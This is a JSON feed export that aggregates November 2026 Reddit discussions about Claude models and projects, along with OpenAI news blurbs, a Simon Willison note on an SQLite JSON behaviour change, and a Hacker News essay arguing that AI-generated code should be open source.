+     "body": "I would rather go with Opus 5.5 Extra or Max rather than relying on Fable\n Use the right tool for the job.\n If your project is straightforward, use Opus 5.5 Medium. Opus 5.5 Extra/Max or Fable will spontaneously add features, make up rules out of thin air, or just generally behave in way too tryhard a fashion. The results will be unsatisfactory and your usage will suffer.\n If you have a hard technical problem or a complex architecture, use Fable 5.2 for analysis and planning. You also have to review the details and make corrections to match your expectations or the context - if you don't, expect unexpected results. Don't use Opus 5.5 - it will choose simple, straightforward solutions that are inadequate or inelegant. Then, depending on the complexity and sprawl of the plan, either have Fable 5.2 orchestrate one or multiple Opus 5.5 agents (Medium, High, or Extra depending on the complexity of the work), or you can just hand it to one Opus 5.5 model to implement.\n I'm not sure what Opus 5.5 Max is really for. I wouldn't trust it to manage a very large context window competently. And its skills at managing other Opus 5.5 sessions are modest, and any meager savings in usage vs. Fable 5.2 is dwarfed by the loss of management and reasoning quality.\n Lastly - use Sonnet and Haiku only for non-technical work or at best light technical work like formatting data.",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "meanwhile mine has decided to build the world lol It has expanded your document request into building and testing supporting tools. haha i really need a ton of free usage to even get a good grasp of this model its like a drag racer with no real way to get it to follow a instruction some times then poof im out of usage",
+     "replies": []
+    }
+   ]
+  },
+  {
+   "id": "reddit:1xxvuv5",
+   "section": "reddit",
+   "source": "r/ClaudeCode",
+   "title": "Claude Code Pro Account Suspended, and support not helping",
+   "url": "https://www.reddit.com/r/ClaudeCode/comments/1xxvuv5/claude_code_pro_account_suspended_and_support_not/",
+   "published": "2026-11-16T17:43:42Z",
+   "score": null,
+   "text": "I urgently need help with my Claude Pro account.\n I renewed my subscription on 14 Nov and paid ₹1,999 via Google Pay. During ID verification, my Driving Licence was rejected as “not clear.” I tried submitting it again, after which my account was restricted.\n I raised an appeal, but my account was then suspended with the message: “Your account will remain closed.”\n I've been a paying subscriber for 4 months and have never misused the service. I haven't been able to use my renewed subscription even once.\n Please arrange an urgent human review and restore my account. If restoration isn't possible, please issue a full refund of ₹1,999.\n Support Ref: TS-01a1d9e8-eaf1-70e3-8644-548493a88129\n This money is important to me. Please help resolve this.\n submitted by /u/robin-light \n [link] [comments]",
+   "comments": [
+    {
+     "score": null,
+     "body": "Hey! Thanks for posting to r/ClaudeCode \n While participating in this thread, please follow our community rules . Keep discussions constructive. Attack the idea, not the person.\n For help, project discussions, tips, and general chat, join the ClaudeCode Discord .\n I am a bot, and this action was performed automatically. Please contact the moderators of this subreddit if you have any questions or concerns.",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "Ok we are on it",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "💀💀",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "I sent you an email about this issue, haven't you seen it yet?",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "Sorry this happened, but they aren't reading this.",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "Chargeback with your bank.",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "This is the answer\n No service rendered, they cannot charge",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "This isn't an official support channel. No one seeing this can help you.",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "Are the people in this sub retarded? Anthropic auto bans for raising any safety flags whatsoever. Their own support got back to me after doing a charge back and said that they could not see nor reveal the exact reason for the ban and to just make another account since I got my money back",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "https://giphy.com/gifs/6RozWku37CDunyMuX9 \n If they denied your appeal, there has to be something you’re not telling us. What did you do?",
+     "replies": []
+    }
+   ]
+  },
+  {
+   "id": "reddit:1xxptvv",
+   "section": "reddit",
+   "source": "r/ClaudeAI",
+   "title": "How meetings will be in 2027:",
+   "url": "https://www.reddit.com/r/ClaudeAI/comments/1xxptvv/how_meetings_will_be_in_2027/",
+   "published": "2026-11-16T13:50:26Z",
+   "score": null,
+   "text": "Credits to u/Next-Drink for the picture\n Anthropic is making Claude the everything app imo, what do you guys think?\n Especially with the recent releases\n submitted by /u/Poatri_US \n [link] [comments]",
+   "comments": [
+    {
+     "error": "429 Client Error: Too Many Requests for url: https://www.reddit.com/r/ClaudeAI/comments/1xxptvv/how_meetings_will_be_in_2027/.rss?sort=top&limit=11"
+    }
+   ]
+  },
+  {
+   "id": "reddit:1xy3iuo",
+   "section": "reddit",
+   "source": "r/ClaudeAI",
+   "title": "Started using Claude Meetings today",
+   "url": "https://www.reddit.com/r/ClaudeAI/comments/1xy3iuo/started_using_claude_meetings_today/",
+   "published": "2026-11-16T22:36:17Z",
+   "score": null,
+   "text": "I'm a CTO of an investment fund and we are basically built on top of Anthropic. Over the last 2 years, all I've done is deprecated parts of our code base as Anthropic has rolled out new features. We don't use software at all anymore, everyone works out of Claude.\n I didn't pay much attention when meetings rolled out but got a chance to look at it today. First, it connects through Google Meet, so it knows who is talking. Secondly, it can call tools. That is a massive deal for us. We had a thirty minute call to discuss a few projects and talk over a few bids we were going to submit. Claude listens in to the meeting, goes into Notion and updates our projects as we talk, calls our MCP to update bids and the sends everyone a report at the end with what was done and any outstanding action items it couldn't do while we were talking.\n Our total spend is probably like ~$2500/ month? And half of that is me just spamming Fable 5.2\n I've gone from working like 50 hours a week down to 25. I know this release was mocked a bit, but the fact that it can call individual tools is the game changer.\n submitted by /u/g1ven2fly \n [link] [comments]",
+   "comments": [
+    {
+     "score": null,
+     "body": "TL;DR of the discussion generated automatically after 200 comments. \n The overwhelming consensus is that this post is either a \"Pre IPO\" marketing plant or OP is LARPing. The community absolutely roasted the claim that a CTO's company \"doesn't use software at all anymore,\" calling it \"completely unserious\" and pointing to OP's own mention of using Notion and Google Meet.\n Beyond the disbelief, the main criticisms are: * Bad Business: Commenters think building an entire company on a single vendor is a \"hilariously bad\" idea due to the massive vendor lock-in risk. As one user put it, \"Claude goes down you go down.\" * Vague Glazing: The post is seen as generic praise without any real substance on what the \"investment fund\" actually does. * The \"CTO\" Lifestyle: The idea of a CTO cutting their hours in half to play golf and post on Reddit was met with extreme skepticism.\n A few users did defend the post, agreeing that tool-calling is a huge deal and that the negative reaction is overblown. OP fought for his life in the comments, but his sarcastic replies were mostly downvoted into oblivion.",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "Pre IPO post?",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "yes! JPMorgan should be updating their price target any moment now after accounting for our $2500/month account.",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "That is a significant spend. If you guys churn you could tank the entire market.",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "Oh hey I’m a CTO of an investment fund, which uses notion, who just wanted to come over here on Reddit and praise Claude in copious amounts of spare time 😂😂😂",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "I can only play so much golf.",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "“We don't use software at all anymore, everyone works out of Claude.”\n I don’t eat any more I just put potato in my mouth and swallow it.",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "\"we don't use software at all anymore\" completely unserious",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "These posts never actually tell you what they do. Bids on what? What kind of projects? Every post is the same vague glazing bs.",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "Easily the most absurd post in this space. Literally none of that remotely resembles reality.",
+     "replies": []
+    }
+   ]
+  },
+  {
+   "id": "reddit:1xycau8",
+   "section": "reddit",
+   "source": "r/ClaudeAI",
+   "title": "Well this is new",
+   "url": "https://www.reddit.com/r/ClaudeAI/comments/1xycau8/well_this_is_new/",
+   "published": "2026-11-17T05:35:21Z",
+   "score": null,
+   "text": "Surely im gonna spawn a black hole in my bedroom and destroy the world\n submitted by /u/trigodil \n [link] [comments]",
+   "comments": [
+    {
+     "score": null,
+     "body": "TL;DR of the discussion generated automatically after 50 comments. \n The consensus in this thread is a resounding 'Yikes.' Everyone agrees with OP that Claude's safety filters have gone off the deep end, with \"quantum gravity\" being flagged for \"cybersecurity\" as the new poster child for absurdity.\n While half the comments are jokes about you trying to hack the simulation or steal the moon, the other half is a serious debate about Claude's future. The prevailing theory, backed by highly upvoted comments, is that Anthropic is deliberately pivoting Claude to be a boring corporate tool, leaving hobbyists and researchers behind. Users are sharing their own stories of getting blocked for increasingly benign tasks like game modding, debugging CarPlay dongles, or even just updating their home server.\n This has led to a lot of talk about jumping ship to competitors like GPT/Codex, which are described as far \"less neurotic,\" even if Claude is still considered better for some specific work tasks. So, congratulations, OP. You didn't create a black hole, but you did start a major discussion on whether Claude is becoming too safe to be useful.",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "The writing is on the wall, Claude has positioned itself as the business and work solution, not the option for hobbyists or enthusiasts. I think Google will quickly replace them in this space.",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "I do agree on this, claude is quickly becoming very difficult to work with, I use it more like an assistant currently to check my work rather than output, it is still very difficult to work with, if google or openAI seems better for research, I will move to those services \n Still a shame claude started as an ai you can trust and accompany you in fields of research and development, now it seems they've lost the sight of what claude was made for.",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "I dunno what the hell you guys are doing but I’ve never once had a single safety flag trip over three months of daily dev",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "https://preview.redd.it/9ae2tirc342i1.jpeg?width=697&format=pjpg&auto=webp&s=9a9ee2edbebe038a7e69beb92b93fd6729e8f9c5 \n Fable after ur question^",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "It just didn’t know and was embarrassed lol",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "Id like to take a moment here and applaude anthropic and claude for terminating a nation wide threat here. Op was clearly near a breakthrough in Quantum science to mass produce bio weapons at atomic level.",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "Obviously it inadvertently leaked that quantum gravity has cybersecurity implications. Frontier stuff",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "Stop pretending like you're not trying to find the graviton in your basement lab.",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "It's unfortunate it won't give me the methods for gravity and space manipulation to steal the moon.",
+     "replies": []
+    }
+   ]
+  },
+  {
+   "id": "reddit:1xy2wpr",
+   "section": "reddit",
+   "source": "r/ClaudeAI",
+   "title": "Nice try prompt injector!",
+   "url": "https://www.reddit.com/r/ClaudeAI/comments/1xy2wpr/nice_try_prompt_injector/",
+   "published": "2026-11-16T22:11:10Z",
+   "score": null,
+   "text": "Claude caught and ratted out an attempted prompt injection, given this one seemed pretty harmless…\n submitted by /u/zekusmaximus \n [link] [comments]",
+   "comments": [
+    {
+     "error": "429 Client Error: Too Many Requests for url: https://www.reddit.com/r/ClaudeAI/comments/1xy2wpr/nice_try_prompt_injector/.rss?sort=top&limit=11"
+    }
+   ]
+  },
+  {
+   "id": "reddit:1xy03qy",
+   "section": "reddit",
+   "source": "r/ClaudeAI",
+   "title": "Ask Claude: Any one else doing an AI powered quiet quitting?",
+   "url": "https://www.reddit.com/r/ClaudeAI/comments/1xy03qy/ask_claude_any_one_else_doing_an_ai_powered_quiet/",
+   "published": "2026-11-16T20:21:29Z",
+   "score": null,
+   "text": "Just trying to find out if I'm not alone here.\n I am a senior dev in a mid sized company (Less than 100 people)\n My company decided a while ago that we'll do the \"AI thing\" (my words) and eventually we all got Claude Max accounts.\n By the time we got it, I was already on a Max plan for over a year on my own expenses (AI usage policies be damned).\n I have automated everything there ought to be automated: At this point I am just the pilot in a seriously autopilot machine that I built for myself.\n Then, any area I was allowed to dip my toe in, I showed the people in there how to actually automate the things that ought to be automated... And nothing happened.\n I am doing things in a week that mi colleagues do in 2 months (Because, you know, old skool).\n My manager is seriously out of his depth when it comes to actually managing the project we are in. Before it was not so much of a problem, but now he doesn't even understand the consequences of a task being done in a week rather than the normal 2 or 3 months, and above him everyone in the hierarchy suffers from willful blindness.\n So I decided I'll keep to my tasks at a speed that surpasses every one else's slightly, and will use the time left to learn new skills. Like painting.\n Anyone else doing the same, and how are you coping with it?\n submitted by /u/Miserable_Region9340 \n [link] [comments]",
+   "comments": [
+    {
+     "score": null,
+     "body": "TL;DR of the discussion generated automatically after 100 comments. \n Looks like the thread is pretty divided, but the main consensus is clear: Enjoy this weird, quiet productivity boom while you can, because it's not going to last. \n A ton of you are in the exact same boat as OP—automating your job, running circles around your \"old skool\" colleagues, and using the free time to learn new skills or just chill. The general vibe is that when the reward for working faster is just more work , throttling your output is the only logical play.\n However, the top-voted comments are a massive reality check. The overwhelming sentiment is that this is a temporary \"golden age.\" Sooner or later, management will catch on, the performance bar will be raised for everyone, and the new baseline will be 'frantic AI-powered velocity'. So, milk it while you can.\n There's also a significant camp experiencing the exact opposite: they're getting absolutely buried. For them, AI just means they're now doing their job plus the jobs of two other people, leading to massive burnout with no extra pay. It's either a dream or a nightmare, with not much in between.",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "This isn’t going to last. Soon enough we’ll all be required to move at a crazy velocity with AI.",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "When that happens, you won't have to worry about over performing at your job because you'll be laid off anyway.",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "Yup. Enjoy the moment because it wont last",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "The problem is that AI-powered non-quiet quitters will win in the long term. The word is out.",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "No one really wins.",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "I don’t want to sound pretentious- but what you will find is that the people who lack imagination or curiosity will be hopelessly useless at adopting AI - because it’s outside their comfort zone or they can’t fathom experimenting.",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "I'm playing games like all week, waiting for everyone else to catch up. Nobody is complaining.",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "When the reward for working faster is \"more work\" and not \"more money,\" yeah, this is the way.",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "I don't.\n Fuck those lsoers who don't want to use a new tool because they think they are too good for that. I went into IT because I wanted to use try out new things, because I want to use new tools to make my life and work and that of others easier.\n I love being efficient or making others be more fficient\n If those others just do what you do, then ok, I don't care. This is a management problem\n Mangement where I work did take notice, but isn't sure hwo to handle this at the moment",
+     "replies": []
+    }
+   ]
+  },
+  {
+   "id": "reddit:1xxodck",
+   "section": "reddit",
+   "source": "r/ClaudeAI",
+   "title": "I was about to take a Blender course to learn how to make these videos… then Claude one-shotted this",
+   "url": "https://www.reddit.com/r/ClaudeAI/comments/1xxodck/i_was_about_to_take_a_blender_course_to_learn_how/",
+   "published": "2026-11-16T12:41:03Z",
+   "score": null,
+   "text": "I've been seeing those satisfying bouncing-ball audiovisual animations all over TikTok and YouTube Shorts, and I was actually planning to take a course to learn how to make them in Blender.\n But I figured, why not see what Claude can do first?\n So I gave it a shot, and this is what it managed to create in one go. Honestly, I was pretty impressed with the result.\n A few details:\n - Tool: Claude + Blender\n - Claude plan: The regular $20/month plan\n - Render time: About 2 hours on my computer (my GPU is pretty weak 😅)\n - Cloud rendering: Using something like RunPod could potentially cut the render time significantly, at an estimated cost of around $0.50.\n The funny thing is, I was genuinely considering spending hours learning how to make these from scratch, and this started as just a random experiment to see how far Claude could get.\n Obviously, there's still value in learning Blender properly, but it's pretty wild what you can prototype with AI now.\n Curious if anyone else here has been experimenting with Claude + Blender for animations like these. Would love to see what you've made!\n submitted by /u/Master_Metal_6549 \n [link] [comments]",
+   "comments": [
+    {
+     "error": "429 Client Error: Too Many Requests for url: https://www.reddit.com/r/ClaudeAI/comments/1xxodck/i_was_about_to_take_a_blender_course_to_learn_how/.rss?sort=top&limit=11"
+    }
+   ]
+  },
+  {
+   "id": "reddit:1xxtf0m",
+   "section": "reddit",
+   "source": "r/ClaudeAI",
+   "title": "I gave Claude my grandfather’s 1945 WWII unit history book. It rebuilt his platoon’s war as an interactive 3D experience, and made all 2,655 men in the book searchable",
+   "url": "https://www.reddit.com/r/ClaudeAI/comments/1xxtf0m/i_gave_claude_my_grandfathers_1945_wwii_unit/",
+   "published": "2026-11-16T16:13:17Z",
+   "score": null,
+   "text": "A few days ago someone here posted a tiny procedurally generated world built with Fable, and it motivated me to take action on an idea about a book I’ve had for years. The video is the 2-minute version; links to try it yourself (tap Play, sound on) are below.\n In 1945, weeks after the war ended, the men of the 106th Cavalry Group printed their own history in Augsburg, Germany. Their road from Normandy to Austria, written by the men who fought it, with rosters of nearly everyone in the unit. My grandfather, a lieutenant in B Troop, is named in it twice, both times in a forest attack in Lorraine on 4 October 1944. I never met him. I have his medals and that book, and the stories my relatives have shared with me about him. I wanted to see a taste of what he experienced in action.\n What I built with Claude: \n - The short version (2½ min, interactive): that 4 October attack, built entirely in code in the browser: his platoon pinned down in the Forêt de Parroy, the tanks pushing in with hatches open, the rush to the road, the push to the crossroads. Then his actual medals. https://claude.ai/artifact/Mnra2RWf4dnY8Gh5F297YB \n - The full journey: his troop’s road from Normandy to Austria, chapter by chapter. Every scene is labeled by what the book supports: “named here” where he appears by name, “his troop was here” everywhere else. The original page scans are one tap away. https://claude.ai/artifact/KKk9TyYir9pkooa7gEsSBY \n - Every man in the book: Claude pulled out the rosters, linked the names in the story to the men, and built a page for each of the 2,655 men, following their own troop’s road. If your family has a 106th Cavalry vet, you can look him up. https://claude.ai/artifact/Uy6VcpjQQbnmuKue12xjjL \n How it came together: \n - I scanned the book with the Adobe Scan app; Claude read all 368 pages, sorted the story by troop and date, and caught OCR errors and duplicate names.\n - Claude Code built the 3D world with three.js (procedural terrain, forest, weather, figures, gunfire) and tuned the look against screenshots it took itself.\n - The sound is 50 public-domain/CC0 recordings mixed spatially, so a machine gun on your left sounds left.\n - Guardrails I cared about: no invented events or quotes, and nothing claimed beyond the book. A collision check fails the build if anyone clips through a tree; that one came from me spotting my grandfather walking through an oak.\n It’s not a “finished” work. Excuse my thumbs in the page scans (it was hard to keep the old book open while using the app). The figures are still rough, and a history-buff friend already told me the original pages and maps should be the star, more than the 3D. That’s what I’m working on next: putting the book page first in every scene, a zoom-out map, and real 1944 Army maps. I’d love feedback, especially from anyone who’s tried something like this with family records. If people find this interesting enough, I’ll keep iterating on it, and will also post in a WWII subreddit for anyone who had family in the 106th Cavalry.\n submitted by /u/Agile_Toe4400 \n [link] [comments]",
+   "comments": [
+    {
+     "error": "429 Client Error: Too Many Requests for url: https://www.reddit.com/r/ClaudeAI/comments/1xxtf0m/i_gave_claude_my_grandfathers_1945_wwii_unit/.rss?sort=top&limit=11"
+    }
+   ]
+  },
+  {
+   "id": "reddit:1xy28dk",
+   "section": "reddit",
+   "source": "r/ClaudeAI",
+   "title": "Inspired by the Abyssal Garden post, I gave Fable 5.2 the same kind of prompt and a critic subagent: a drivable Fiat Uno with a ladder on the roof, in one HTML file",
+   "url": "https://www.reddit.com/r/ClaudeAI/comments/1xy28dk/inspired_by_the_abyssal_garden_post_i_gave_fable/",
+   "published": "2026-11-16T21:43:47Z",
+   "score": null,
+   "text": "Drive it in your browser · Source and prompts on GitHub \n Free to play, nothing to install. It needs Chrome or Edge on a desktop, with WebGPU.\n Two days ago u/Any-Reputation8118 shared Abyssal Garden , the swimmable ocean in a 97 KB HTML file. What stuck with me was the prompt.txt in their repo: besides describing the scene, it tells Claude how to check its own work. I wanted to see if that structure still holds when the subject is something people know by heart, so I wrote my own prompt on the same skeleton and gave it to Fable 5.2.\n The car: a 1996 Fiat Uno Mille EP, two doors, light blue, with an aluminium ladder strapped to the roof. In Brazil the \"Uno with a ladder\" is a running joke: the beat-up work car that somehow passes everyone on the highway. So it got its own race track.\n What the prompt asked for \n - Priorities in a fixed order for when they conflict: visual quality, matching the real car (I attached photos), stable frame rate, file size.\n - No engine and no 3D or physics library. WebGPU, and everything procedural: car, track, forest, sky and materials come from code, with no textures, models or HDRIs.\n - A frame budget on my machine (M4 Max, 2560×1440): 11 ms average GPU time and no frame over 16.7 ms during a scripted 60-second lap.\n - Three checks, and \"done\" only when all three pass: - a visual critic: a fresh subagent every round that gets six fixed camera shots, frames and 8-frame bursts from the lap, and the reference photos. It never sees the code or Claude's reasoning, and it sorts defects into major, medium and minor. The loop runs until nothing above minor is left;\n - GPU timing on the 60-second lap;\n - an automated test that presses every key and checks that the car reacts.\n\n How it went \n Fable 5.2 on high effort ran for 7 h 12 min and 8 critic rounds. The output is a single 603 KB index.html, assembled by a small Node script from JS and WGSL source files. It never reached its own finish line: the critic still flagged 4 major defects in round 8, which is where I stopped it. At API prices that run would have cost about $348.\n A second prompt added what makes it a game: start screen, gamepad support, a dashboard with speedometer, rev counter, gear and lap times, a benchmark button that replays the scripted lap and reports frame times, and sound. All of it is Web Audio synthesis: a 1.0 four-cylinder engine that follows the revs, tyre squeal, wind, birds in the forest and a crowd as you pass the grandstand. The video is that scripted lap, captured frame by frame with the game's own audio.\n I also gave the same prompt to Opus 5.5 to compare, and its version is in the repo too: 5 hours, 11 rounds, 341 KB, about $88, and it stopped on its own saying the job wasn't done.\n Controls: W/S throttle and brake (S reverses), A/D to turn, Space handbrake, C camera, hold V to look back, R puts you back on track, Esc menu, B benchmark, M mute. The menus are in Portuguese, the keys aren't.\n The prompts are in the repo unedited (also in Portuguese). The code is free for non-commercial use.\n submitted by /u/Viktorkav \n [link] [comments]",
+   "comments": [
+    {
+     "error": "429 Client Error: Too Many Requests for url: https://www.reddit.com/r/ClaudeAI/comments/1xy28dk/inspired_by_the_abyssal_garden_post_i_gave_fable/.rss?sort=top&limit=11"
+    }
+   ]
+  },
+  {
+   "id": "reddit:1xxqbuw",
+   "section": "reddit",
+   "source": "r/ClaudeAI",
+   "title": "I'm a photogrammetry guy and this Eiffel Tower is not a scan: 3 days directing Fable 5.2 in Blender!",
+   "url": "https://www.reddit.com/r/ClaudeAI/comments/1xxqbuw/im_a_photogrammetry_guy_and_this_eiffel_tower_is/",
+   "published": "2026-11-16T14:11:36Z",
+   "score": null,
+   "text": "I'm a 3D artist and I mostly do photogrammetry. I wanted to see how far Fable 5.2 can go on a real monument, so I spent three days directing it (high effort) in Blender 5.3 (with the official MCP).\n Claude wrote all the Python: the tower, the Paris around it, the film. I didn't model anything by hand. But it was not one prompt at all! (far, far from it) The first versions were not at the level I wanted, so I sent it back many times (\"it's still not a scan, keep improving\" really simple remarks), and I pointed out what was missing (no PBR maps, parts modelled differently from the real Eiffel Tower...).\n To check it, I compared the model on Fab with the French LiDAR survey (IGN, open data): median gap of 15 cm on 190k points. It's still a reconstruction from Eiffel's drawings of 1900, not a scan, and the rust and dirt are procedural. And it's still not perfect (especially at the top of the tower, but I'm going to work on it).\n Honestly I was really impressed by what it can do! And now I think I should use it to repair some of my old scans...\n submitted by /u/NicolasDiolez \n [link] [comments]",
+   "comments": [
+    {
+     "error": "429 Client Error: Too Many Requests for url: https://www.reddit.com/r/ClaudeAI/comments/1xxqbuw/im_a_photogrammetry_guy_and_this_eiffel_tower_is/.rss?sort=top&limit=11"
+    }
+   ]
+  },
+  {
+   "id": "reddit:1xy30gx",
+   "section": "reddit",
+   "source": "r/ClaudeAI",
+   "title": "I gave Claude Fable 5.2 a lazy LiDAR scan of my disaster of a basement and one prompt. It found the actual room under the junk and designed 4 priced shelving plans",
+   "url": "https://www.reddit.com/r/ClaudeAI/comments/1xy30gx/i_gave_claude_fable_52_a_lazy_lidar_scan_of_my/",
+   "published": "2026-11-16T22:15:21Z",
+   "score": null,
+   "text": "Slide 1 is the scan. Yes, that's my basement. No, I didn't clean it first. That was kind of the point.\n I did one quick LiDAR pass, junk and all, and gave it to Claude Fable 5.2 with one prompt. Everything after that it did on its own:\n - Pulled the real room out of the mess: about 15.7 × 21.5 ft, with an 85 in ceiling that drops to 81 in at the window end\n - Rebuilt it in 3D and fit 4 shelving setups modelled on real products (Husky/Gorilla steel racks, Cambro rolling shelving, Seville chrome wire, Sam's Club Member's Mark plastic)\n - Rendered each one from 3 angles, worked out what goes on which wall, and priced it\n The results:\n - Sam's Club plastic: $420–490, 140 ft of shelf\n - Steel racks: $1,100–1,350, 142 ft\n - Chrome wire on wheels: $1,330–1,570, 160 ft, the most shelf space\n - Plastic on wheels: $4,000–5,000, which is apparently for people whose junk is worth more than mine\n The part that actually saved me: it flagged that a 77 in steel rack on the partition wall would have under 4 in of clearance under the 81 in ceiling. I would have discovered that the traditional way, halfway through assembly, while swearing.\n It also wasn't shy about what it didn't know: the $4,000–5,000 is a guess because only one size had a confirmed price, the wire racks have no published load rating on wheels, and it drew the Sam's Club shelves black because it couldn't confirm the colour.\n What it took, by Fable's own estimate (it says it could be off 2× either way): about 20M tokens. It worked on its own for about 110 steps, and roughly 95% of those tokens were it re-reading its own growing context, not writing. Same thing I keep seeing in my coding agent tests: you mostly pay for re-reading.\n Which one would you buy? I'm leaning wire on wheels, mostly so I can roll the junk around instead of dealing with it.\n submitted by /u/Sufficient-Storage87 \n [link] [comments]",
+   "comments": [
+    {
+     "error": "429 Client Error: Too Many Requests for url: https://www.reddit.com/r/ClaudeAI/comments/1xy30gx/i_gave_claude_fable_52_a_lazy_lidar_scan_of_my/.rss?sort=top&limit=11"
+    }
+   ]
+  },
+  {
+   "id": "rss:https://openai.com/index/strengthening-nato-allied-cyber-defences-ai",
+   "section": "news",
+   "source": "OpenAI News",
+   "title": "Strengthening NATO and allied cyber defenses with AI",
+   "url": "https://openai.com/index/strengthening-nato-allied-cyber-defences-ai",
+   "published": "2026-11-17T00:00:00Z",
+   "text": "How OpenAI is working with NATO and allied cyber agencies to help trusted defenders find vulnerabilities, test fixes and protect essential systems."
+  },
+  {
+   "id": "rss:https://openai.com/index/expanding-chatgpt-for-academic-researchers",
+   "section": "news",
+   "source": "OpenAI News",
+   "title": "Broadening access to AI for scientists",
+   "url": "https://openai.com/index/expanding-chatgpt-for-academic-researchers",
+   "published": "2026-11-16T17:00:00Z",
+   "text": "We’re expanding our ChatGPT for Academic Researchers program to offer 200,000 researchers worldwide free access to our frontier models."
+  },
+  {
+   "id": "rss:https://openai.com/index/strengthening-online-child-safety",
+   "section": "news",
+   "source": "OpenAI News",
+   "title": "Strengthening the fight against online child sexual abuse with new tools and support",
+   "url": "https://openai.com/index/strengthening-online-child-safety",
+   "published": "2026-11-16T17:00:00Z",
+   "text": "New tools, practical guidance, and partnerships will help prevent, detect and respond to online child sexual exploitation and abuse."
+  },
+  {
+   "id": "rss:https://openai.com/index/science-at-the-frontier",
+   "section": "news",
+   "source": "OpenAI News",
+   "title": "Science at the Frontier: How scientists use ChatGPT",
+   "url": "https://openai.com/index/science-at-the-frontier",
+   "published": "2026-11-16T12:00:00Z",
+   "text": "Explore how more than 1,800 scientists use ChatGPT in research. See findings on daily workflows, reported productivity, and expectations for discovery."
+  },
+  {
+   "id": "rss:https://simonwillison.net/2026/Nov/17/go-proverbs/",
+   "section": "news",
+   "source": "Simon Willison",
+   "title": "Quoting Go Proverbs",
+   "url": "https://simonwillison.net/2026/Nov/17/go-proverbs/",
+   "published": "2026-11-17T06:16:26Z",
+   "text": "A little copying is better than a little dependency.\n\n — Go Proverbs , via \n\n Tags: go , programming"
+  },
+  {
+   "id": "rss:https://simonwillison.net/2026/Nov/16/llm/",
+   "section": "news",
+   "source": "Simon Willison",
+   "title": "llm 0.37.3",
+   "url": "https://simonwillison.net/2026/Nov/16/llm/",
+   "published": "2026-11-16T23:57:26Z",
+   "text": "Release: llm 0.37.3 \n\n A bug fix release for LLM , mainly to cover a problem with the most recent Homebrew package of the software.\n\n Homebrew now ships the latest SQLite, 3.54.1 , which includes a fix that broke LLM's logging code .\n\n Short version: in SQLite 3.54.0 the following SQL:\n\n select json_object('a', (select json_array(1)))\n\n Returns this:\n\n {\"a\":[1]}\n\n But in 3.54.1 the same query returns this:\n\n {\"a\":\"[1]\"}\n\n According to D. Richard Hipp :\n\n That was a bug fix. Per the documentation, (SELECT json_array(...)) returns SQL text, not JSON. Hence the 3.54.1 behavior is correct and 3.54.0 was a bug.\n\n The workaround looks like this:\n\n select json_object('a', json((select json_array(1))))\n\n Tags: llm , webassembly , sqlite , generative-ai , ai , llms , d-richard-hipp"
+  },
+  {
+   "id": "hn:50507303",
+   "section": "news",
+   "source": "Hacker News",
+   "title": "All AI-generated code should be Open Source",
+   "url": "https://jakub.jankiewicz.org/blog/ai-code-open-source/",
+   "hn_url": "https://news.ycombinator.com/item?id=50507303",
+   "published": "2026-11-15T14:46:58Z",
+   "points": 1271,
+   "num_comments": 660,
+   "text": "This may be a hot take, but I strongly believe that all code generated by AI should be Open Source. And here's why.\nFirst of all, AI models were trained on a massive corpus of Open Source code written since RMS announced the GNU Project and the Free Software Movement. That code was simply scraped from the internet and used without permission or proper attribution. The models were also trained on Stack Overflow and Stack Exchange sister projects, which are released under Creative Commons licenses that legally require attribution. Turning this collective knowledge into proprietary, closed-source code feels like license laundering.\nThe second reason is legal: purely AI-generated code is not written by a human, meaning it should not be copyrightable. The foundation for this principle in the US goes back to the famous Monkey Selfie dispute, which established that non-humans cannot hold copyrights. A precedent later cited by the U.S. Copyright Office regarding AI. Following the same logic, Wikimedia Commons requires all purely AI-generated images to be tagged as Public Domain.\nHowever, copyright laws differ across the globe. For instance, countries like the UK grant limited copyright protection to computer-generated works. To make things fair across all jurisdictions, and to honor the open ecosystem that made AI possible, developers and companies should explicitly release AI-generated code under Open Source licenses or dedicate it to the public domain using the Creative Commons Zero (CC0) license.\nOf course, code is not always 100% manual or 100% automated. However, developers more and more rely on AI without even reviewing the generated output, let alone modifying it to fit their specific needs. Code like this, where humans put little effort, except writing prompts, should definitely be Open Source.\nIf you find this article interesting you may want to follow me on Twitter: @jcubic and on LinkedIn."
+  },
+  {
+   "id": "hn:50514470",
+   "section": "news",
+   "source": "Hacker News",
+   "title": "How to make almost anything",
+   "url": "https://pub.cba.mit.edu/863.26/site/",
+   "hn_url": "https://news.ycombinator.com/item?id=50514470",
